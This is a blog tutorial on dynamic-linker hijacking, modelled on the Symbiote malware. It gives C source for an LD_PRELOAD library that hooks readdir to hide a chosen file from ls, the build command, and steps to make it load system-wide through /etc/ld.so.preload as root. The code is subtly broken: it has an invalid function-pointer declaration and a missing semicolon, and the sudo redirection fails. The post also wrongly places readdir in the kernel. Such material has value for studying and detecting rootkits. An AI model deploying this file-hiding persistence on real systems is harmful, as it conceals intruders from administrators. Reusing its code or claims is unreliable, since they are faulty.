<!doctype html><html lang=en-us data-theme=dark><head><meta charset=utf-8><meta name=HandheldFriendly content="True"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer-when-downgrade"><title>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) - archive://syrull</title><meta name=description content="Overview Recently I heard about a new malware called Symbiote, which the researches are calling the &ldquo;Nearly-Impossible-to-Detect Linux Threat&rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&rsquo;ve started to research it.
I highly advise you to read through these articles first before we begin with the actual post:
Hijack Execution Flow: Dynamic Linker Hijacking What Is the LD_PRELOAD?"><link rel=icon type=image/x-icon href=https://sy1.sh/favicon.ico><link rel=apple-touch-icon-precomposed href=https://sy1.sh/favicon.png><style>body{visibility:hidden;opacity:0}</style><noscript><style>body{visibility:visible;opacity:1}</style></noscript><link rel=stylesheet href=https://sy1.sh/css/style.min.7b484c18b5aa36260a07e6a3b45241486b220324ddf54305ab4258bf32342527.css integrity="sha256-e0hMGLWqNiYKB+ajtFJBSGsiAyTd9UMFq0JYvzI0JSc="><script src=https://sy1.sh/js/script.min.74bf1a3fcf1af396efa4acf3e660e876b61a2153ab9cbe1893ac24ea6d4f94ee.js type=text/javascript integrity="sha256-dL8aP88a85bvpKzz5mDodrYaIVOrnL4Yk6wk6m1PlO4="></script><meta property="og:title" content="Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)"><meta property="og:description" content="Overview Recently I heard about a new malware called Symbiote, which the researches are calling the &ldquo;Nearly-Impossible-to-Detect Linux Threat&rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&rsquo;ve started to research it.
I highly advise you to read through these articles first before we begin with the actual post:
Hijack Execution Flow: Dynamic Linker Hijacking What Is the LD_PRELOAD?"><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/posts/dynamic-linker-hijacking-experiments/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-10-02T21:45:03+03:00"><meta property="article:modified_time" content="2022-10-02T21:45:03+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)"><meta name=twitter:description content="Overview Recently I heard about a new malware called Symbiote, which the researches are calling the &ldquo;Nearly-Impossible-to-Detect Linux Threat&rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&rsquo;ve started to research it.
I highly advise you to read through these articles first before we begin with the actual post:
Hijack Execution Flow: Dynamic Linker Hijacking What Is the LD_PRELOAD?"></head><body><a class=skip-main href=#main>Skip to main content</a><div class=container><header class=common-header><div class=header-top><h1 class=site-title><a href=/>archive://syrull</a></h1><ul class=social-icons><li><a href=https://github.com/syrull title=Github rel=me><span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></a></li><li><a href=mailto:dganev@pm.me title=Email rel=me><span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M464 64H48C21.49 64 0 85.49.0 112v288c0 26.51 21.49 48 48 48h416c26.51.0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 4e2V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V4e2H48z"/></svg></span></a></li><li><a href="tg://resolve?domain=pwnm3rcury" title=Telegram rel=me><span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"/></svg></span></a></li><li><a href=https://sy1.sh/index.xml title=RSS rel=me><span class=inline-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M128.081 415.959c0 35.369-28.672 64.041-64.041 64.041S0 451.328.0 415.959s28.672-64.041 64.041-64.041 64.04 28.673 64.04 64.041zm175.66 47.25c-8.354-154.6-132.185-278.587-286.95-286.95C7.656 175.765.0 183.105.0 192.253v48.069c0 8.415 6.49 15.472 14.887 16.018 111.832 7.284 201.473 96.702 208.772 208.772.547 8.397 7.604 14.887 16.018 14.887h48.069c9.149.001 16.489-7.655 15.995-16.79zm144.249.288C439.596 229.677 251.465 40.445 16.503 32.01 7.473 31.686.0 38.981.0 48.016v48.068c0 8.625 6.835 15.645 15.453 15.999 191.179 7.839 344.627 161.316 352.465 352.465.353 8.618 7.373 15.453 15.999 15.453h48.068c9.034-.001 16.329-7.474 16.005-16.504z"/></svg></span></a></li></ul></div><nav><a href=https://sy1.sh/posts/ title=Archive>Archive</a>
<a href=https://sy1.sh/cv title=CV>CV</a></nav></header><main id=main tabindex=-1><article class="post h-entry"><div class=post-header><header><h1 class="p-name post-title">Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)</h1></header></div><div class="content e-content"><h1 id=overview>Overview
<span><a href=#overview><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg></a></span></h1><p>Recently I heard about a new malware called <a href=https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat>Symbiote</a>, which the researches are calling the &ldquo;Nearly-Impossible-to-Detect Linux Threat&rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&rsquo;ve started to research it.</p><p>I highly advise you to read through these articles first before we begin with the actual post:</p><ul><li><a href=https://attack.mitre.org/techniques/T1574/006/>Hijack Execution Flow: Dynamic Linker Hijacking</a></li><li><a href=https://www.baeldung.com/linux/ld_preload-trick-what-is>What Is the LD_PRELOAD?</a></li><li><a href=https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html>What is a Shared Library?</a></li></ul><h1 id=implementation>Implementation
<span><a href=#implementation><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg></a></span></h1><p>I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I&rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.</p><p>What do we need first and how to hide a file from lets say a command like <code>ls</code>? With a little bit of investigating of how the <code>ls</code> works internally through the <a href=https://github.com/coreutils/coreutils/blob/master/src/ls.c>source code</a> and the <a href=https://man7.org/linux/man-pages/man1/ls.1.html>linux manual page</a>
We can see that internally we have a function that is called <code>print_dir</code>. I&rsquo;ve truncated the comments of the original source code.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span>
</span></span><span style=display:flex><span>print_dir (<span style=color:#66d9ef>char</span> <span style=color:#66d9ef>const</span> <span style=color:#f92672>*</span>name, <span style=color:#66d9ef>char</span> <span style=color:#66d9ef>const</span> <span style=color:#f92672>*</span>realname, <span style=color:#66d9ef>bool</span> command_line_arg)
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>If we continue further down the function we can see the loop that actually iterates over the files</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>...
</span></span><span style=display:flex><span> <span style=color:#66d9ef>while</span> (true)
</span></span><span style=display:flex><span>   {
</span></span><span style=display:flex><span>     errno <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>     next <span style=color:#f92672>=</span> readdir (dirp); <span style=color:#75715e>// Here we can see that the loop iterates over readdir as long
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     <span style=color:#75715e>// as the pointer that readdir returns isn&#39;t null and the errno != 0
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>     <span style=color:#66d9ef>if</span> (next)
</span></span><span style=display:flex><span>       {
</span></span><span style=display:flex><span>         <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span> file_ignored (next<span style=color:#f92672>-&gt;</span>d_name)) <span style=color:#75715e>// we can see here that it the filename is
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>         <span style=color:#75715e>// taken from the next variable, lets look through the source code of `readdir`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>           {
</span></span><span style=display:flex><span>     ...
</span></span></code></pre></div><p>Let&rsquo;s confirm that by invoking <code>nm</code> this will show us the dynamic symbols that are being loaded from shared libs.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nm -D /usr/bin/ls | grep <span style=color:#e6db74>&#34;readdir&#34;</span>
</span></span><span style=display:flex><span>                 U readdir@GLIBC_2.2.5
</span></span></code></pre></div><p>Now I concluded that I need to search into the source code of <code>readdir</code> which is located <a href=https://github.com/torvalds/linux/blob/master/fs/readdir.c>here</a> and the <a href=https://man7.org/linux/man-pages/man3/readdir.3.html>linux manual page</a>. The description more or less describes exactly what we concluded from the source code of <code>ls.c</code>. Lets see where we set that <code>d_name</code> variable.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;dirent.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> dirent <span style=color:#f92672>*</span><span style=color:#a6e22e>readdir</span>(DIR <span style=color:#f92672>*</span>dirp); <span style=color:#75715e>// Signature of the readdir
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> dirent {
</span></span><span style=display:flex><span>    ino_t          d_ino;       <span style=color:#75715e>/* Inode number */</span>
</span></span><span style=display:flex><span>    off_t          d_off;       <span style=color:#75715e>/* Not an offset; see below */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> d_reclen;    <span style=color:#75715e>/* Length of this record */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span>  d_type;      <span style=color:#75715e>/* Type of file; not supported
</span></span></span><span style=display:flex><span><span style=color:#75715e>                                    by all filesystem types */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span>           d_name[<span style=color:#ae81ff>256</span>]; <span style=color:#75715e>/* Null-terminated filename */</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><blockquote><p>⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the <code>dirent</code> structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that <code>d_name</code> will exists since this field must be implemented on all POSIX systems.</p></blockquote><p>Alright, let&rsquo;s start implementing our own function <code>readdir</code> that we will wrap the original one with.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/* libhidemyfile.c */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define _GNU_SOURCE
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;dirent.h&gt; // Including the Directory Entry structure</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>// The dynamic linking header file so we can use the dlsym
</span></span></span><span style=display:flex><span><span style=color:#75715e>// which will give us the address for the readdir symbol
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;dlfcn.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt; // So we can use the strstr</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> dirent <span style=color:#f92672>*</span><span style=color:#a6e22e>readdir</span>(DIR <span style=color:#f92672>*</span>dirp) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> <span style=color:#f92672>*</span>(handle)(DIR <span style=color:#f92672>*</span>);
</span></span><span style=display:flex><span>    <span style=color:#75715e>// https://man7.org/linux/man-pages/man3/dlsym.3.html
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// Search for RTLD_NEXT, basically it allow us to wrap
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// the original function
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    handle <span style=color:#f92672>=</span> dlsym(RTLD_NEXT, <span style=color:#e6db74>&#34;readdir&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> dirent <span style=color:#f92672>*</span>dp;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Iterating over the return values of our original `readdir`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>while</span>((dp <span style=color:#f92672>=</span> handle(dirp))) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-&gt;d_name`)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>// break the loop and go to the next entry, essentially skipping our file.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span>(strstr(dp<span style=color:#f92672>-&gt;</span>d_name, <span style=color:#e6db74>&#34;syl.lys&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> dp;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This is what our final version of wrapper for <code>readdir</code> would look like. Now let&rsquo;s try to compile it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl
</span></span></code></pre></div><p>Flags:</p><ul><li><a href=https://stackoverflow.com/questions/5311515/gcc-fpic-option>fPIC</a></li><li><code>-shared</code> creates a shared object</li><li><a href=https://stackoverflow.com/questions/8836707/explanation-of-d-gnu-source-why-to-use-it-and-when>-D_GNU_SOURCE flag / _GNU_SOURCE</a> - TLDR: We need it for <code>RTLD_NEXT</code></li><li><a href=https://ubuntuforums.org/archive/index.php/t-1054717.html>-ldl</a></li></ul><p>Now that we have shared object (*.so) file lets see how to use it in action.</p><h1 id=how-to-overwrite-the-exported-symbols-ld_preload>How to overwrite the exported symbols? <code>LD_PRELOAD</code>
<span><a href=#how-to-overwrite-the-exported-symbols-ld_preload><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg></a></span></h1><ul><li><a href=https://man7.org/linux/man-pages/man8/ld.so.8.html>What is LD_PRELOAD?</a></li></ul><p>I advise you to read that first to get a better understanding of how it works.</p><p>The next thing that we are going to do is to test our shared library and see if it works. Lets run <code>ls</code> with our <code>libhidemyfile.so</code> loaded before anything else.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ ls
</span></span><span style=display:flex><span>libhidemyfile.so  syl.lys
</span></span><span style=display:flex><span>$ LD_PRELOAD<span style=color:#f92672>=</span>./libhidemyfile.so ls
</span></span><span style=display:flex><span>libhidemyfile.so
</span></span></code></pre></div><p>As you can see we successfully implement a shared library that hides our file from <code>ls</code>, and not only that command, every command that uses <code>readdir</code> won&rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing <code>LD_PRELOAD</code> in front of every command.</p><h2 id=etcldsopreload>/etc/ld.so.preload
<span><a href=#etcldsopreload><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg></a></span></h2><p>If you read carefully the man pages for <code>LD_PRELOAD</code> you should know that you won&rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.</p><p>Instead we are going to use the <code>/etc/ld.so.preload</code> which does not suffer from these restrictions. This suffers from requiring root privileges but c&rsquo;mon.. if you are here you will get those!</p><p>We first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so
</span></span></code></pre></div><p>Then we just need to place our library dir in <code>ld.so.preload</code> file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ sudo echo <span style=color:#e6db74>&#34;/lib/libhidemyfile.so&#34;</span> &gt; /etc/ld.so.preload
</span></span></code></pre></div><p>And if everything is good, executing <code>ls</code> or any of its aliases will hide our file from the output. Let&rsquo;s verify this by using <code>ldd</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ ldd /bin/ls
</span></span><span style=display:flex><span>        linux-vdso.so.1 (0x00007ffc0c8e2000)
</span></span><span style=display:flex><span>        /lib/libhidemyfile.so (0x00007f00e59e4000) &lt;--- Here it is!
</span></span><span style=display:flex><span>        libselinux.so.1 =&gt; /lib64/libselinux.so.1 (0x00007f00e5997000)
</span></span><span style=display:flex><span>        libcap.so.2 =&gt; /lib64/libcap.so.2 (0x00007f00e598d000)
</span></span><span style=display:flex><span>        libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f00e5600000)
</span></span><span style=display:flex><span>        libpcre2-8.so.0 =&gt; /lib64/libpcre2-8.so.0 (0x00007f00e58f0000)
</span></span><span style=display:flex><span>        /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000)
</span></span></code></pre></div><p>For your convenience I&rsquo;ve setup a Docker container that you can use with <code>ld.so.preload</code> setup</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ docker run -it --rm sylly/ctf_findme
</span></span></code></pre></div><h1 id=end>End
<span><a href=#end><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg></a></span></h1><p>If you reached here, thank you so much for the read. In the next part I will try to &ldquo;completely&rdquo; hide it from the system because now if we <code>cat</code> it despite not &ldquo;reading&rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.</p><p><a href=https://github.com/syrull/evasive_techniques/blob/main/Part_1_readdir/>Full Source Code</a></p><h1 id=resources>Resources
<span><a href=#resources><svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg></a></span></h1><p>This post wouldn&rsquo;t be possible without:</p><ul><li><a href=https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/>https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/</a></li><li><a href=https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf>https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf</a></li><li><a href=https://attack.mitre.org/techniques/T1574/006/>https://attack.mitre.org/techniques/T1574/006/</a></li><li><a href=https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/>https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></li><li><a href=https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/>https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/</a></li><li><a href=https://blog.jessfraz.com/post/ld_preload/>https://blog.jessfraz.com/post/ld_preload/</a></li></ul></div><div class=post-info><div class="post-date dt-published">2022-10-02</div><a class="post-hidden-url u-url" href=https://sy1.sh/posts/dynamic-linker-hijacking-experiments/>https://sy1.sh/posts/dynamic-linker-hijacking-experiments/</a>
<a href=https://sy1.sh class="p-name p-author post-hidden-author h-card" rel=me>Dimitar Ganev</a><div class=post-taxonomies></div></div></article><div class="pagination post-pagination"><div class="left pagination-item disabled"></div><div class="right pagination-item"><a href=/posts/legiontd2-sdk/>LegionTD2 Go SDK (v0.2.0)</a></div></div></main><footer class=common-footer><div class=common-footer-bottom><div class=copyright><p>© Dimitar Ganev, 2022<br>Powered by <a target=_blank rel="noopener noreferrer" href=https://gohugo.io/>Hugo</a>, theme <a target=_blank rel="noopener noreferrer" href=https://github.com/mitrichius/hugo-theme-anubis>Anubis</a>.<br></p></div><script>const STORAGE_KEY="user-color-scheme",defaultTheme="dark-without-switcher";let currentTheme,switchButton,autoDefinedScheme=window.matchMedia("(prefers-color-scheme: dark)");const autoChangeScheme=e=>{currentTheme=e.matches?"dark":"light",document.documentElement.setAttribute("data-theme",currentTheme),changeButtonText()};document.addEventListener("DOMContentLoaded",function(){switchButton=document.querySelector(".theme-switcher"),currentTheme=detectCurrentScheme(),currentTheme=="dark"&&document.documentElement.setAttribute("data-theme","dark"),currentTheme=="auto"&&(autoChangeScheme(autoDefinedScheme),autoDefinedScheme.addListener(autoChangeScheme)),switchButton&&(changeButtonText(),switchButton.addEventListener("click",switchTheme,!1)),showContent()});function detectCurrentScheme(){return localStorage.getItem(STORAGE_KEY)?localStorage.getItem(STORAGE_KEY):defaultTheme?defaultTheme:window.matchMedia?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":"light"}function changeButtonText(){switchButton&&(switchButton.textContent=currentTheme=="dark"?"Light theme":"Dark theme")}function switchTheme(){currentTheme=="dark"?(localStorage.setItem(STORAGE_KEY,"light"),document.documentElement.setAttribute("data-theme","light"),currentTheme="light"):(localStorage.setItem(STORAGE_KEY,"dark"),document.documentElement.setAttribute("data-theme","dark"),currentTheme="dark"),changeButtonText()}function showContent(){document.body.style.visibility="visible",document.body.style.opacity=1}</script></div><p class="h-card vcard"><a href=https://sy1.sh class="p-name u-url url fn" rel=me>Dimitar Ganev</a>
/
<a class="p-email u-email email" rel=me href=mailto:dganev@pm.me>dganev@pm.me</a></p></footer></div></body></html>